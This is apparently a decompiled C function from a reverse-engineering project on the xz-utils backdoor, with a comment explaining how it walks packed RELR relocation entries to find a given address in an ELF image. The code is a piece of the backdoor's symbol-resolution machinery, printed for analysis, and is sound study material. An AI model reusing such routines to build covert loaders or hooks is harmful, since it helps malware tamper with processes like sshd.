// /home/kali/xzre-ghidra/xzregh/101C30_elf_find_relr_reloc.c
// Function: elf_find_relr_reloc @ 0x101C30
// Calling convention: __stdcall
// Prototype: Elf64_Relr * __stdcall elf_find_relr_reloc(elf_info_t * elf_info, EncodedStringId encoded_string_id)


/*
 * AutoDoc: Performs the same search as `elf_find_rela_reloc` but against the packed RELR format. It replays the RELR decoding algorithm (literal entry vs bitmap entry), sanity-checks each decoded pointer with `elf_contains_vaddr`, compares the pointed-to value against the requested target address, and optionally enforces a lower/upper bound plus an iteration cursor via the extra argument registers. Returning NULL means there were no RELR records, the address never appeared in the run, or one of the decoded pointers failed validation.
 */
#include "xzre_types.h"


Elf64_Relr * elf_find_relr_reloc(elf_info_t *elf_info,EncodedStringId encoded_string_id)

{
  uint uVar1;
  Elf64_Ehdr *pEVar2;
  BOOL BVar3;
  Elf64_Relr *in_RCX;
  Elf64_Relr *in_RDX;
  ulong uVar4;
  undefined4 in_register_00000034;
  uchar *vaddr;
  ulong *in_R8;
  long lVar5;
  Elf64_Relr EVar6;
  ulong uVar7;
  
  pEVar2 = elf_info->elfbase;
  if ((elf_info->flags & 4) != 0) {
    uVar1 = elf_info->relr_relocs_num;
    if ((CONCAT44(in_register_00000034,encoded_string_id) != 0) && (uVar1 != 0)) {
      uVar4 = 0;
      if (in_R8 != (ulong *)0x0) {
        uVar4 = *in_R8;
      }
      EVar6 = CONCAT44(in_register_00000034,encoded_string_id) - (long)pEVar2;
      lVar5 = 0;
      for (; uVar4 < uVar1; uVar4 = uVar4 + 1) {
        vaddr = pEVar2->e_ident + lVar5;
        uVar7 = elf_info->relr_relocs[uVar4];
        if ((uVar7 & 1) == 0) {
          vaddr = pEVar2->e_ident + uVar7;
          BVar3 = elf_contains_vaddr(elf_info,vaddr,8,4);
          if (BVar3 == 0) {
            return (Elf64_Relr *)0x0;
          }
          if ((*(Elf64_Relr *)vaddr == EVar6) &&
             ((in_RDX == (Elf64_Relr *)0x0 || ((in_RDX <= vaddr && (vaddr <= in_RCX)))))) {
LAB_00101d98:
            if (in_R8 != (ulong *)0x0) {
              *in_R8 = uVar4 + 1;
              return (Elf64_Relr *)vaddr;
            }
            return (Elf64_Relr *)vaddr;
          }
          lVar5 = uVar7 + 8;
        }
        else {
          while (uVar7 = uVar7 >> 1, uVar7 != 0) {
            if ((uVar7 & 1) != 0) {
              BVar3 = elf_contains_vaddr(elf_info,vaddr,8,4);
              if (BVar3 == 0) {
                return (Elf64_Relr *)0x0;
              }
              if ((*(Elf64_Relr *)vaddr == EVar6) &&
                 ((in_RDX == (Elf64_Relr *)0x0 || ((in_RDX <= vaddr && (vaddr <= in_RCX))))))
              goto LAB_00101d98;
            }
            vaddr = vaddr + 8;
          }
          lVar5 = lVar5 + 0x1f8;
        }
      }
      if (in_R8 != (ulong *)0x0) {
        *in_R8 = uVar4;
      }
    }
  }
  return (Elf64_Relr *)0x0;
}

